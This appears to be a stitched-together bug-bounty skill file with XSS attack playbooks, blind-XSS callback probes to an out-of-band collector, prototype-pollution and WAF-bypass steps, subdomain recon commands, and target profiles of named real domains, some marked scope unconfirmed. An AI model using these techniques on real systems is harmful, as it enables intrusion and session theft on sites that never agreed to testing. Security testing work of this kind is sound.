https://<TARGET>/app?next=<payload>            # window.name variant: pre-set via attacker page
```

**Confirm:** debugger/wrapper shows attacker bytes reaching the sink AND the rendered DOM contains the injected node firing the proof — dynamic taint observation plus post-execution DOM state.

**False positives:** sanitization hiding in the helper chain (most grep hits are decode-then-escape); sinks fed from server state (`window.__DATA__`) an attacker can't set; `window.name`/`localStorage` vectors requiring attacker script already on the origin (self-XSS unless you prove delivery); `JSON.parse` — a source, not a sink.

**Impact:** DOM XSS is reflected-equivalent but lives client-side — patching needs a frontend release (slower, version-gated), which strengthens "time to fix" arguments in the report.

**Remediation:** replace the sink with a safe one (`textContent`, allowlisted `setAttribute`) or sanitize at the sink with an HTML parser after all decoding.

**CWE / OWASP:** CWE-79 / OWASP A03:2021 Injection.

---

## [Bugbountyskills.md] V-04: Persistent storage script injection (stored XSS architecture)

**Mechanism:** Attacker input persists server-side (DB row, log, file, cache) and renders unencoded to whoever later views it. The violated assumption: "input was validated on write" — write-time validation checks the *write* parser's context, while rendering runs through a different, richer parser.

**Preconditions:**
- A writable field: profile, comment, ticket, filename, product name, CMS body.
- It renders in HTML to at least one other viewer role.
- Write-time filtering incomplete, or differently encoded than at render.

**Detect:**
1. Inventory every writable field reachable in your test account — including "benign" ones juniors skip: display name, avatar alt text, filename, webhook description, triggerable error text.
2. Plant a unique marker (`zz7f3`) in each; re-login, re-fetch via API, diff which responses carry it verbatim vs. encoded vs. absent.
3. For verbatim fields, run V-02's ladder against the *rendering* endpoint, not the saving one.
4. If a second test account is allowed, fetch the render page as that account to learn who actually sees it.

**Proof of concept:**
```http
POST /api/profile HTTP/1.1        → {"displayName":"<PAYLOAD-TEMPLATE>"}
GET  /profile/<ACCOUNT_ID>        ← response must contain payload bytes verbatim
```

**Confirm:** a *different session or account* (fresh browser profile, no cache, no attacker state) gets the executing payload; persistence survives logout/login.

**False positives:** self-view-only fields (self-XSS unless admins also view them); raw bytes in the API but sanitized HTML in the render (test the render!); email-only rendering (not XSS); claiming cross-user impact from a single session.

**Impact:** phrase as who-sees-it: "any user viewing the victim's profile executes attacker JS" or "an admin reviewing the report executes attacker JS" — audience drives severity (stored + admin = High/Critical).

**Remediation:** encode contextually at *render* time for every consumer of the stored field, and allowlist-sanitize rich fields on both write and render.

**CWE / OWASP:** CWE-79 / OWASP A03:2021 Injection.

---

## [Bugbountyskills.md] V-05: Out-of-band testing (blind XSS tracking engines)

**Mechanism:** The payload executes where you never see the render — admin panel, log viewer, CRM preview, screenshot/monitoring bot, email-security crawler — and you learn via a callback to infrastructure you control. The violated assumption: "internal viewers are trusted operators"; their rendered content is yours.

**Preconditions:**
- An attacker-controlled string is stored or logged for later internal viewing.
- The internal render path executes scripts (no strict internal CSP) or fetches URLs.
- You control an OOB collector (Burp Collaborator, interactsh, logged VPS).

**Detect:**
1. Target fields plausibly seen internally: support tickets, abuse reports, payment memos, usernames, logged headers, filenames, webhook payloads.
2. Plant *script-requiring* payloads, not plain `<img src>` — a bare image hit proves fetch, not execution. Give each field a unique `i=<UNIQ>` in the callback URL so hits are attributable to field + payload family.
3. Plant 3-5 variants per field (classic `<script src>`, `onerror`, SVG `onload`, filtered-evasion form — `payloads.md` §3/§4).
4. Watch the collector; classify each hit by which marker fired (execute-marker vs. fetch-marker).

**Proof of concept:**
```http
POST /api/ticket            → {"subject":"<PAYLOAD-WITH-//<OOB_DOMAIN>/b?i=<UNIQ>>","body":"..."}
GET  /b?i=<UNIQ>            ← callback should carry internal page URL + browser UA
```

**Confirm:** callback arrives from a browser-like UA *with the internal page URL* (or your DOM marker appears in a screenshot-bot's output). A bare TCP hit from the target's crawler IP may be a URL-preview fetch — not JS execution.

**False positives:** link-preview/scanner bots that fetch without executing (why you use distinct markers per payload type); your own earlier tests firing from your own session (unique IDs + retention-window retests); DNS-only callbacks proving nothing about HTML context.

**Impact:** highest-severity XSS when the audience is privileged: "stored payload executes in an administrator's browser, granting the attacker the admin's session capabilities" — state explicitly what you did NOT do (proof marker only) and what a real attacker could do.

**Remediation:** render-time encoding applies to internal views too — admin panels are the *most* dangerous render path — plus strict CSP on internal tools and `default-src 'none'`-style policies on HTML email.

**CWE / OWASP:** CWE-79 / OWASP A03:2021 Injection.

---

## [Bugbountyskills.md] V-06: Browser SOP defiance (universal XSS / UXSS)

**Mechanism:** A browser-engine bug lets attacker script run holding the origin of a *different* site — via flawed `document.domain` handling, URL-parser disagreement, `about:blank`/`srcdoc` origin inheritance, or renderer bugs in DOM APIs. The violated guarantee is the browser's isolation model itself, not any application's input handling.

**Preconditions:**
- A specific vulnerable browser build (pin and name the version).
- Reproducible in a clean profile, extensions disabled.
- **Scope reality:** this is a browser-vendor finding — web-app programs won't pay it; report to the browser program, at most note it as context in the app report.

**Detect:**
1. Exhaust app-side explanations first: iframe without `sandbox` (expected), CORS headers (server bug), explicit `document.domain` relaxation (app misconfig), unvalidated postMessage (app bug).
2. Test only with two domains you own (origin A embedding/observing origin B) — never against third-party sites.
3. Probe known-buggy edges on your lab pair: `srcdoc` iframe origin inheritance, `about:blank` navigation after `document.write`, `document.domain` setter, SVG/`use` cross-origin reads.
4. Check the latest canary — many UXSS bugs die in nightly long before stable.

**Proof of concept:** (own domains only)
```html
<iframe id="f" src="https://<ORIGIN_B>/index.html"></iframe>
<script>f.onload=()=>{document.title='UXSS:'+tryReadCrossOrigin();}</script>
```

**Confirm:** cross-origin DOM access succeeds on a pinned vulnerable build AND fails on the next build (or with the suspected API disabled) — the differential proves it's the engine, not the app.

**False positives:** sandboxed iframes missing `allow-same-origin` (sandbox working as designed); CORS reflecting your `Origin` (server-side finding); `postMessage` accepting `'*'` (app bug); legitimate same-site subdomains sharing origin.

**Impact:** browser program: "full SOP bypass enables session hijacking of any site the victim visits" — Critical. App report: context only; never claim app impact from a browser bug.

**Remediation:** vendor patch (browser program); app-side defense-in-depth only if an app vector contributed: `frame-ancestors`, `Cross-Origin-Opener-Policy`, `Cross-Origin-Resource-Policy`.

**CWE / OWASP:** CWE-346 (Origin Validation Error) / OWASP A05:2021 Security Misconfiguration.

---

## [Bugbountyskills.md] V-07: Parsing misalignment (mutation XSS / mXSS vs DOMPurify)

**Mechanism:** The sanitizer parses HTML one way, serializes it, and the browser's `innerHTML` parser re-parses differently — namespace switching (SVG/MathML in HTML), `<noscript>`/`<form>`/`<table>` nesting correction, browser-specific serialization quirks mutate inert markup into executable markup *after* sanitization. The violated assumption: "sanitized = safe", where sanitization is a lossy translation between two parsers that don't agree.

**Preconditions:**
- Sanitizer pass (DOMPurify, purifiers) followed by an `innerHTML`-style re-parse.
- A known differential: namespace confusion, `<template>`/`<noscript>` nesting, or a version with published bypasses (check the shipped version!).
- Attacker input reaches the sanitizer (stored field, `v-html`, `dangerouslySetInnerHTML`, rich text).

**Detect:**
1. Read `DOMPurify.version` (or package lock) and check its advisory history for mutation bypasses.
2. Check pipeline order: sanitize → serialize → `innerHTML` → serialize again? Classic mutation needs *two* round-trips.
3. Feed namespace-switching probes (`payloads.md` §2.9), capture output, then double round-trip in console: `el.innerHTML = el.innerHTML;` — mutation often appears only on the second pass.
4. Inspect the live DOM (never the string) for `<img onerror>`/`<svg onload>` nodes the string output didn't visibly contain.

**Proof of concept:**
```text
POST <MUTATION-PAYLOAD> → GET render page → paste output into console:
var d=document.createElement('div'); d.innerHTML=OUT; d.innerHTML=d.innerHTML; console.log(d.innerHTML);

## [Bugbountyskills.md] V-09: DOM XSS-assisted prototype pollution exploitation

**Mechanism:** Attacker JSON pollutes `Object.prototype` (via `$.extend`/`lodash.merge`/recursive copy honoring `__proto__` or `constructor.prototype`), and a *gadget* elsewhere reads the polluted property into a dangerous sink — `script.src` from a polluted option, sanitizer config disabled by pollution, callback/`transform` functions. The violated assumption: "objects have the shape the code wrote" — every `{}` inherits attacker keys.

**Preconditions:**
- Client-side merge sink reachable with attacker JSON (query, postMessage, localStorage, stored JSON read on load).
- A gadget in a loaded library (jQuery <3.4.0 `$.extend`, vulnerable lodash merge, AngularJS config gadgets, sanitizer-option pollution).
- No `Object.freeze(Object.prototype)` in the bundle — check!

**Detect:**
1. Grep for merge sinks: `$.extend(true`, `_.merge`, nested `Object.assign`, recursive `merge(`/`deepCopy(` fed from `location`/`postMessage`.
2. Probe harmlessly: inject `{"__proto__":{"zzprobe":"1"}}` at the sink, then in console check `({}).zzprobe` — `"1"` proves the write. Also try `{"constructor":{"prototype":{"zzprobe":"1"}}}` (bypasses naive `__proto__` filters).
3. Hunt gadgets: loaded libs reading option properties into sinks (`script.src`, library `innerHTML` renders, `sanitize` config keys, `parseHTML` flags).
4. Turn the gadget into execution using `payloads.md` — the pollution step and trigger step are two separate requests/actions.

**Proof of concept:**
```http
POST /api/prefs       {"settings":"{\"__proto__\":{\"<GADGET_KEY>\":\"<PAYLOAD>\"}}"}
GET  /app             ← merge runs, gadget reads polluted key, fires
```

**Confirm:** `({}).<pollutedKey>` evaluates to your value in the victim page context, AND the proof fires on a *separate* page/request from the injection — that separation distinguishes pollution from direct DOM injection.

**False positives:** your JSON reflected straight into `innerHTML` (no pollution — the `zzprobe` check runs first, always); server-side Node pollution (different chain → `info-disclosure-testing`/`rce-testing`; verify in the *browser* console, not response diffs); pollution with no gadget = integrity/DoS issue, not XSS; libraries already stripping `__proto__` (lodash ≥4.17.11 safe-merge) — confirm versions.

**Impact:** "pollution reaches a gadget executing attacker JS" — High; also note pollution may alter security-relevant flags elsewhere (sanitizer toggles), potentially compounding into a second finding.

**Remediation:** `Object.create(null)` config maps or frozen prototypes, strip `__proto__`/`constructor` at the merge boundary, and fix the gadget sink — one layer alone stays exploitable.

**CWE / OWASP:** CWE-1321 (Prototype Attributes) chained with CWE-79 / OWASP A03:2021 Injection.

## [Bugbountyskills.md] >> xss-testing — variants-2.md (variant playbook)

*Source: `/root/Myskill/xss-testing/references/variants-2.md`*

## [Bugbountyskills.md] Variants 10-18 — xss-testing

Continues from `variants-1.md`. Encoding/evasion primitives (double URL encoding, entity
encoding, comment splitting) are tabulated in `payloads.md` §4.

## [Bugbountyskills.md] V-10: Cross-context resiliency (universal polyglot payloads)

**Mechanism:** One payload is syntactically valid in several contexts at once — HTML text, quoted/unquoted attribute, JS string, comment, URL — so it fires regardless of which of several sinks the input reaches, or when the context can't be determined before firing. The violated assumption is defensive redundancy: apps encode for *one* context while the reflection lands in another; a polyglot survives the mismatch.

**Preconditions:**
- Unknown or multiple reflection contexts: multi-parameter pages, template with several slots, or a WAF that punishes per-shape probing.
- At least one context in the polyglot's coverage renders unsanitized.

**Detect:**
1. The signal *is* the ambiguity: several params reflect, context changes per template, or boundary probes (V-02 ladder) return mixed results.
2. Fire one polyglot probe (`payloads.md` §3) across all candidate params.
3. After execution, reduce: remove payload pieces until it stops firing — the piece that mattered is your real context; then exploit it precisely with the V-02 family for a cleaner report.
4. Record per-parameter contexts for steps-to-reproduce.

**Proof of concept:**
```bash
for p in q search name next; do
  curl -s "https://<TARGET>/path?${p}=<POLYGLOT-PROBE>" | grep -o '.\{0,60\}<POLYGLOT-MARKER>.\{0,60\}'
done
```

**Confirm:** execution in a real browser on the winning parameter AND the reduction test identifying the single context it actually exploited — report the precise context, not "polyglot magic".

**False positives:** polyglot reflecting in 5 params but executing in 0 (HTML-encoded everywhere — grep hits are not hits); execution only in a hand-edited URL (self-XSS); reporting the polyglot when a boring single-context payload suffices — triage distrusts them; probe fragments matching unrelated markup (check the rendered DOM, not response bytes).

**Impact:** phrase it like the precise context it turned out to be (V-02 style) plus the robustness note: "works across template variants, so filter-style partial fixes won't kill it."

**Remediation:** per-slot context-aware encoding — a polyglot succeeding proves encoding is context-blind; fix the slots, don't hunt the magic string.

**CWE / OWASP:** CWE-79 / OWASP A03:2021 Injection.

---

## [Bugbountyskills.md] V-15: Second-order reflected XSS via client-side cache injection

**Mechanism:** Attacker input reaches the victim on a *later* request through a persistence layer that isn't a database: browser `localStorage`/`sessionStorage` (app stores a redirect/pref and re-renders it next visit), service-worker or shared HTTP cache (poisoned via an unkeyed input: `X-Forwarded-Host`, `X-Original-URL`, path variants), or client-side routing state. The violated assumption: "this value came from *my* storage/cache, so it's trustworthy" — origin of storage ≠ origin of authorship.

**Preconditions:**
- (a) client-side state: app writes attacker strings to storage, later reads them into a sink (V-03), or (b) shared cache: cache key omits the reflecting header/param so you can poison other users' responses.
- For (b): a caching layer (CDN/WAF/app cache) keying on URL while your payload rides an unkeyed input.

**Detect:**
1. Client-side: after visiting an attacker-shaped URL, dump `localStorage`, `sessionStorage`, IndexedDB, service-worker caches (DevTools → Application); then re-visit *without* the crafted URL and watch those values render.
2. Shared cache: identify reflected unkeyed inputs (`X-Forwarded-Host`, `X-Original-URL`, `X-Rewrite-URL`, `Origin`, `Referer`); send poison request, then a *clean* victim request (same URL, no header, different session); payload returning = shared poison.
3. Read `Age`/`X-Cache`/`Via` and replay with a `?cb=` cache-buster to separate cache-served from dynamic responses.
4. Grade by blast radius: storage-based = same victim who clicked your link (next visit); shared cache = any visitor, zero interaction — much higher severity.

**Proof of concept:**
```http
GET /page                       X-Forwarded-Host: <ATTACKER-VALUE-REFLECTED-AS-PAYLOAD>   # poison
GET /page                       (clean session, no special headers)                        # victim fetch
```
Storage variant: request A that *stores* the string, request B (clean URL) that *renders* it.

**Confirm:** the clean request/client-side state produces the payload *without the attacker input riding along* — that's what makes it second-order. For shared cache, reproduce from a second network position or cookie-less client to rule out personalized caching of your own session.

**False positives:** same-user HTTP cache or bfcache replay (you sent it yourself); personalized pages cached for your own session (only you see it); service worker caching only your own visits (downgrade: "requires prior visit"); CDN echoing your own poisoned response back to *you* (test with a clean client before claiming cross-user).

**Impact:** severity hinges on audience: shared-cache poisoning with no interaction = High/Critical (any visitor, no click); client-storage second-order = Medium unless other roles trigger it. State the delivery precondition explicitly.

**Remediation:** include every reflected input in the cache key (or don't reflect headers), mark personalized responses `Cache-Control: no-store`, and re-encode stored client state at render.

**CWE / OWASP:** CWE-79 / CWE-524 (Cache Containing Sensitive Information) / OWASP A03:2021 Injection.

---

## [Bugbountyskills.md] V-17: MIME-sniffing assisted XSS (Content-Type misconfigurations)

**Mechanism:** The browser is allowed (or tricked) into *reinterpreting* a response's type: attacker content served as `text/plain` with no `X-Content-Type-Options: nosniff`, a wrong/missing Content-Type, content-type override params (`?format=html`, `Accept:` negotiation), double extensions (`x.jpg.html`), path parameters (`file.jpg;.html`), `.HTML` case / Windows trailing-dot tricks — and the browser parses it as an HTML document running your script. The violated assumption: "Content-Type is authoritative" — without `nosniff` it's a suggestion to sniffing paths, and you may control it directly.

**Preconditions:**
- Attacker-influenced bytes in a response (upload, echo, error page).
- Missing/incorrect `nosniff`, loose/wrong Content-Type, or a user-controllable Content-Type mechanism.
- A parsing path in the *actual* target browsers: modern Chrome/Firefox honor `text/plain`+`nosniff`; sniffable cases include legacy IE/EdgeHTML, missing types, mislabeled `text/html` — verify real behavior, not folklore.

**Detect:**
1. For each attacker-influenced response record: `Content-Type`, `X-Content-Type-Options`, `Content-Disposition`, body prefix.
2. Try type-control mechanisms: `?format=html|json|text`, `Accept: text/html` vs `application/json`, `X-Requested-With` toggles, filename tricks you control (`p.jpg.html`, `p.jpg;.html`, `.HTML`, Windows `p.html.`/`p.html%20`), `.php.jpg` chains on misconfigured hosts.
3. Open each variant **in a browser** (not curl): check `document.contentType` and whether `<zz1>` parsed as an element (DevTools Elements).
4. For `text/plain` + no `nosniff` containing full HTML: confirm actual browser behavior for that pairing before claiming — the header combination *is* the bug, browser support decides severity.

**Proof of concept:**
```http
GET /download/<FILE_ID>?format=html     Accept: text/html
```
Browser assertion in the opened response: `document.contentType` → `text/html`; `!!document.querySelector('zz1')` → `true`.

**Confirm:** browser parses the bytes as a document and executes the proof — two signals: recorded response headers (verbatim) + browser execution. Sniff-test without the vulnerable header combination is not enough.

**False positives:** response already carrying `nosniff` + correct type (sniffing off — dead); `Content-Disposition: attachment` downloads (no render); `image/svg+xml` with `nosniff` (that's V-14's wrong-type question, not sniffing); curl showing HTML bytes (bytes aren't the vuln — classification is); IE-sniffing claims against a Chrome/Firefox audience (note as legacy-only).

**Impact:** "user-uploaded content executes as HTML in the application origin because the response lacks `nosniff` and carries a permissive Content-Type" — High for stored uploads on the app origin; the fix is one header, which usually lands as quick, triage-friendly remediation.

**Remediation:** always send `X-Content-Type-Options: nosniff` on user-content responses, declare the correct Content-Type, use `Content-Disposition: attachment` (or an untrusted origin) for downloads.

**CWE / OWASP:** CWE-79 / CWE-430 (Deployment of Wrong Handler) / OWASP A05:2021 Security Misconfiguration.

---

## [Bugbountyskills.md] V-18: Breaking Trusted Types via unsanitized policy injection sinks

**Mechanism:** The page enforces Trusted Types (`script-src ...; require-trusted-types-for 'script'`) so sinks only accept `TrustedScript` objects from named policies. It breaks when (a) the attacker can *create or configure* a policy — policy name or its `createHTML`/`createScript` derived from attacker data (policy injection), (b) an existing policy is a passthrough (`createHTML: s => s`), or (c) execution uses a TT-uncovered path: event-handler attributes, `javascript:` in `href`/`formaction`, `iframe srcdoc`, CSS — looping back to V-02 attribute/URL contexts. The violated assumption: "policies are code-authored" — if policy selection/bodies are data-driven, the guard keys are attacker-held.

**Preconditions:**
- CSP actually **enforcing**: `require-trusted-types-for 'script'` present (report-only ≠ enforcement — read the directive, not just the header).
- An app-created policy whose name/config/behavior is attacker-influenceable, OR a TT-uncovered sink reachable (attribute injection, `srcdoc`, `javascript:` URL).
- `trustedTypes.createPolicy` calls visible in the bundle — grep them; there may be only a few.

**Detect:**
1. Read the CSP: enforcement vs `report-only`; the `trusted-types` directive lists allowed policy names — an allowlist, and its absence means any name can be created.
2. Grep the bundle for `trustedTypes.createPolicy` — inspect handlers: passthrough (`s => s`), naive regex strip, or name built from user data (`createPolicy(userInput, ...)` — throws under an allowlist, injection point without one).
3. Baseline: fire a naive `onerror` payload — a "Trusted Types violation" console error proves enforcement is real (and correctly blocked your probe).
4. Probe gaps: `javascript:` in injected `href`/`formaction` (click-required), `iframe srcdoc`, `eval`-family only if `'unsafe-eval'` appears in TT config, and DOM clobbering of policy lookups (`<form name="policies"><input name="sanitizer">` where app code does `window.policies[name]`).
5. Passthrough policy found → feed your payload straight through its consumer sink; no bypass needed, the policy *is* the bypass.

**Proof of concept:**
```http
GET /page?tpl=<PAYLOAD-THROUGH-PASSTHROUGH-POLICY>      # weak policy path
GET /page?next=javascript:<PROOF>()                     # TT-uncovered URL sink — then click
```

**Confirm:** payload executes with **no** TT violation in the console (proving an allowed path, not that TT is off), plus a header snapshot showing `require-trusted-types-for 'script'` was active, plus the specific weakness named (passthrough / injectable name / uncovered sink).

**False positives:** TT in **report-only** mode (nothing enforced — that's "TT not enforced", a misconfiguration, not a bypass); claiming a bypass when the payload never hit a TT-guarded sink (test `innerHTML` first — a violation throw means enforcement is real); a policy name absent from `trusted-types` being "exploitable" without showing attacker control of the creation input (trace where the name comes from); DOM-clobbering claims where the app uses local variables rather than `window` lookups (read the actual code path first).

**Impact:** "Trusted Types present but defeated via passthrough policy / injectable policy creation / uncovered URL sink" — High, and worth calling out because teams treat TT as a checkbox; state which of the three failure modes it is — remediation differs per mode.

**Remediation:** give every policy a non-passthrough body (`createHTML` = DOMPurify/allowlist), pin names in the `trusted-types` directive, keep enforcement (not report-only), and close the uncovered gap (encode `href`/`formaction`, disallow `srcdoc`) — fixing enforcement while leaving a weak policy changes nothing.

**CWE / OWASP:** CWE-79 / CWE-693 (Protection Mechanism Failure) / OWASP A03:2021 Injection.

### [Bugbountyskills.md] XSS

1. Find input fields in forms, URL parameters, headers
2. Check if input reflected in response
3. Try WAF bypass variants (no-space, comment abuse, Unicode)
4. Test stored XSS on IDs that persist
5. Test DOM-based XSS (JS sink analysis)

### [Bugbountyskills.md] XSS Pattern

```
1. Find input fields in forms, URL parameters, headers
2. Check if input is reflected in response
3. Try WAF bypass variants (no-space, comment abuse, Unicode)
4. Test stored XSS on IDs that persist
5. Test DOM-based XSS (JS sink analysis)
```

### [Bugbountyskills.md] Phase 1 — Subdomain Enumeration

1. `subfinder -d <domain> -silent -t 20 -nW -o <file>` — enumerate all subdomains
2. `cat <files> | sort -u > all_subdomains.txt` — aggregate all domain files
3. `httpx -l all_subdomains.txt -silent -status-code -content-length -title -follow-redirects -threads 50 -t 10` — find live hosts
4. Save live output to `live_subdomains.txt` (format: `ip <tab> status_code <tab> host`)
5. Filter interesting hosts: `grep -E "(pay|klook\.tech|klook\.io|affiliate|admin|api|api\.klktech|login|sandbox|stage|dev|stg|uat|intranet|internal|jenkins|sentry)" live_subdomains.txt`

## [Bugbountyskills.md] subzy run --targets "$domain/subdomains_all_${domain}.txt" --hide_fails > "$domain/subzy_${domain}.txt"

<!-- exact-duplicate entries folded in: 1 -->

### [Bugbountyskills.md] Example: XSS on register form

```
Control:    {"email":"test@test.com","name":"test"}          → 050006 "invalid request parameter"
Test:       {"email":"test@test.com","name":"<script>alert(1)</script>"} → 050006 "invalid request parameter"
Conclusion:  WAF is functioning. NO XSS vulnerability.
```

### [Bugbountyskills.md] A. Cross-Site Scripting

- Reflected XSS (RXSS).
- DOM-based XSS.
- Stored and persistent XSS.
- Blind XSS.
- GET-based and POST-based XSS.
- HTML injection leading to demonstrable script execution.
- JavaScript-context, HTML-context, attribute-context, and URL-context injection.
- Client-side template and DOM manipulation flaws.
- postMessage and origin-validation issues.
- Unsafe DOM sinks, source-to-sink tracing, sanitization bypasses, and encoding mistakes.
- XSS through redirects, JSON, URL parameters, headers, uploads, and application features.
- Stored XSS in administrative interfaces and delayed-rendering workflows.

Differentiate HTML injection from executable XSS. Consider CSP, browser context, user interaction, privileges, and actual impact.

### [Bugbountyskills.md] J. Other Security Domains

Study and classify:

- Security misconfiguration.
- Cryptographic failures.
- Insecure design.
- Software or data integrity failures.
- Software supply-chain failures.
- Security logging and alerting failures.
- Mishandling of exceptional conditions.
- Hardcoded credentials.
- Open redirects.
- Path traversal and file inclusion.
- DNS misconfiguration and subdomain takeover.
- Race conditions and time-of-check/time-of-use errors.
- File upload and download vulnerabilities.
- Cache poisoning and web cache deception.
- Host-header and proxy trust failures.
- Request smuggling and parser discrepancies.
- CVEs, patch-diff analysis, vulnerable dependencies, and version-specific security flaws.

Learn the relevant OWASP Top 10 categories, OWASP API Security Top 10, CWE classifications, and applicable CVE/CVSS conventions. Keep classification aligned with the demonstrated root cause.

## [Bugbountyskills.md] 2026-10-21 — SPA DOM-XSS hunting on a hashed-bundle PhantomBuster app

- Source: user engagement — "check https://v2staging.phantombuster.io/ and test any more
  DOM xss"; found one report on `/redirect`, hunted for more.
- Method (V-03 static→dynamic funnel, worked well): (1) reconstruct the chunk/route graph
  from the lazy-import map in the main bundle + the route constants table; (2) download every
  chunk (3.1MB / 76 chunks); (3) intersect source chunks (location.search/hash, document.URL,
  window.name, postMessage, URLSearchParams) with sink chunks (innerHTML/outerHTML/
  insertAdjacentHTML/document.write/eval/location.replace/assign/href=/setAttribute);
  (4) hand-trace each intersection's source→sink dataflow; (5) confirm exploitability of the
  ambiguous ones in a real browser; (6) dynamic sink-hook sweep over reachable routes as a
  backstop. Static analysis correctly predicted every dynamic result.
- Findings: confirmed the reported DOM XSS (source `location.search` → sink
  `location.replace(e)`, no scheme/host check, `javascript:` accepted). Ruled out everything
  else with concrete reasons (see below). Side finding (auth class, not XSS): a preview-token
  URL param is read and pushed into a session setter — flag for an auth-capable reviewer, do
  not force into an XSS bucket.
- Two false-positive sinks that LOOKED exploitable and were NOT — memorize the reasons:
  (a) react-router `Link to={urlParam}` / `history.push(urlParam)`: v5 `createHref`
  normalizes a raw `javascript:`/`https://evil` value by prepending `/`, turning it into a
  same-origin path (inert). Only a protocol-relative `//host` survives, and only as an
  open-redirect gated on a modifier click (ctrl+click / open-in-new-tab). Empirically tested
  with a local react-router-dom@5 harness. Apparent `window.location.replace(urlParam)` may
  actually be a route-builder that hardcodes a leading `/` — trace before calling it.
  (b) postMessage → innerHTML: if the handler gates on `e.origin === <fixed const>`, it is
  not attacker-reachable unless that exact host is separately compromised — chain, not a
  standalone bug.
- Tooling that mattered: Playwright (see gotchas) + `--break-system-packages` for pip; a
  local react-router harness to settle router-normalization questions offline.
- Hook gotcha (cost me two wasted runs): a greedy dynamic-sink-hook init script that
  overrode the `Function` constructor crashed Vite module init → app never booted → 0 hits
  looked like "clean." Add a positive control on a KNOWN-working sink on every sweep; if the
  control doesn't fire, fix the instrumentation before believing any zeros.
- Class: technique → skill: `xss-testing` (V-03 dynamic funnel + the two FP patterns);
  `bug-hunter` (chunk/route enumeration)

## [Bugbountyskills.md] 6. DOMAIN PROFILES & FINDINGS

_Per-domain profile skills — each created when a domain was first mentioned._

## [Bugbountyskills.md] >> [bug-hunter/references/domain-template.md] domain-template.md

*Source: `/root/Myskill/bug-hunter/references/domain-template.md`*

## [Bugbountyskills.md] Domain profile template

Copy this skeleton to `domains/<domain>/SKILL.md` and fill it in. Keep the frontmatter
description — it is what makes the profile advertise itself as a skill.

```markdown
---
name: <domain>
description: Recon notes, scope, attack surface, tested history and open leads for <domain> — use when hunting on this target, resuming a previous engagement, or when a conversation mentions <domain>.
---

## [Bugbountyskills.md] <domain>

**Program / authorization:** <name + link, or "own infra", or "UNKNOWN — confirm before testing">
**Last engagement:** <date or "never">

### [Bugbountyskills.md] Subdomains & hosts

| Host | Purpose | Stack | Notes |
|---|---|---|---|

## [Bugbountyskills.md] >> [domains/aida.de/SKILL.md] SKILL.md

*Source: `/root/Myskill/domains/aida.de/SKILL.md`*

### [Bugbountyskills.md] Subdomains & hosts

| Host | Purpose | Stack | Notes |
|---|---|---|---|
| aida.de | main marketing/booking site | Akamai + AEM (Java) | 403 to automation |
| www.aida.de | alias of above | Akamai | identical 403, identical `akamai-grn` |
| www.aida4us.com | guest portal (frame-ancestors ref) | unknown | **scope unconfirmed — not tested** |

## [Bugbountyskills.md] >> [domains/bb.bigid.cloud/SKILL.md] SKILL.md

*Source: `/root/Myskill/domains/bb.bigid.cloud/SKILL.md`*

### [Bugbountyskills.md] Subdomains & hosts

| Host | Purpose | Stack | Notes |
|---|---|---|---|
| bb.bigid.cloud | test lab | unknown | primary target |

## [Bugbountyskills.md] >> [domains/casino-baden-baden.de/SKILL.md] SKILL.md

*Source: `/root/Myskill/domains/casino-baden-baden.de/SKILL.md`*

### [Bugbountyskills.md] Subdomains & hosts

| Host | Purpose | Stack | Notes |
|---|---|---|---|
| `shop-staging.casino-baden-baden.de` | staging shop | Apache + Basic auth | **in scope (operator-confirmed)** |
| `shop.casino-baden-baden.de` | shop (prod?) | Apache | same IP 178.16.58.223 — scope UNCONFIRMED |
| `casino-baden-baden.de` / `www.` | main site | 92.205.22.180 | scope UNCONFIRMED |
| `casinobadenbaden.de` | alt domain | 88.198.116.121 | scope UNCONFIRMED |

CT logs only contain `casino-baden-baden.de` + `*.casino-baden-baden.de`; the staging host
has its own separate LE cert and does not appear in CT.

## [Bugbountyskills.md] >> [domains/frontier.com/SKILL.md] SKILL.md

*Source: `/root/Myskill/domains/frontier.com/SKILL.md`*

### [Bugbountyskills.md] Subdomains & hosts

| Host | Purpose | Stack | Notes |
|---|---|---|---|
| bgp.frontier.com | BGP application info + BGP routing request form | Apache+PHP+Alteon | primary scope |
| ipadmin.frontier.com | same app, mirrored vhost | same | byte-identical responses |

## [Bugbountyskills.md] >> [domains/frontier.com/evidence/config-surface-2026-10-24.md] config-surface-2026-10-24.md

*Source: `/root/Myskill/domains/frontier.com/evidence/config-surface-2026-10-24.md`*

## [Bugbountyskills.md] >> [domains/frontier.com/evidence/xss-retest-2026-10-24.md] xss-retest-2026-10-24.md

*Source: `/root/Myskill/domains/frontier.com/evidence/xss-retest-2026-10-24.md`*

## [Bugbountyskills.md] XSS retest — /bgp_procedures_new_form.php (asn + all fields) — 2026-10-24

Purpose: verify the user-pasted report (reflected XSS, unquoted attribute, `asn`) against
the CURRENT behavior of bgp.frontier.com, and determine whether the same class exists on
any other endpoint of the two in-scope hosts.

## [Bugbountyskills.md] >> [domains/frontier.com/findings/001-gitignore-structure-disclosure.md] 001-gitignore-structure-disclosure.md

*Source: `/root/Myskill/domains/frontier.com/findings/001-gitignore-structure-disclosure.md`*

## [Bugbountyskills.md] >> [domains/frontier.com/findings/002-exposed-internal-config-endpoints.md] 002-exposed-internal-config-endpoints.md

*Source: `/root/Myskill/domains/frontier.com/findings/002-exposed-internal-config-endpoints.md`*

## [Bugbountyskills.md] >> [domains/getoutlaw.com/SKILL.md] SKILL.md

*Source: `/root/Myskill/domains/getoutlaw.com/SKILL.md`*

## [Bugbountyskills.md] >> [domains/getoutlaw.com/findings/F-01-getbundle-unauthenticated.md] F-01-getbundle-unauthenticated.md

*Source: `/root/Myskill/domains/getoutlaw.com/findings/F-01-getbundle-unauthenticated.md`*

## [Bugbountyskills.md] >> [domains/getoutlaw.com/findings/F-02-checkaccount-enumeration.md] F-02-checkaccount-enumeration.md

*Source: `/root/Myskill/domains/getoutlaw.com/findings/F-02-checkaccount-enumeration.md`*

## [Bugbountyskills.md] >> [domains/hub.devolutions.com/SKILL.md] SKILL.md

*Source: `/root/Myskill/domains/hub.devolutions.com/SKILL.md`*

### [Bugbountyskills.md] Subdomains & hosts

| Host | Purpose | Stack | Notes |
|---|---|---|---|
| hub.devolutions.com | Devolutions Cloud app | CF + Envoy + SPA | 172.65.90.4-7 (Cloudflare) |
| login.devolutions.com | identity (guess) | TBD | named in CSP default-src |
| login.devolutions.xyz | identity (guess) | TBD | named in CSP default-src |
| *.blob.core.windows.net | fonts/icons | Azure | third-party, out of scope |

## [Bugbountyskills.md] >> [domains/hub.devolutions.com/findings/F-01-opensearch-credential-disclosure.md] F-01-opensearch-credential-disclosure.md

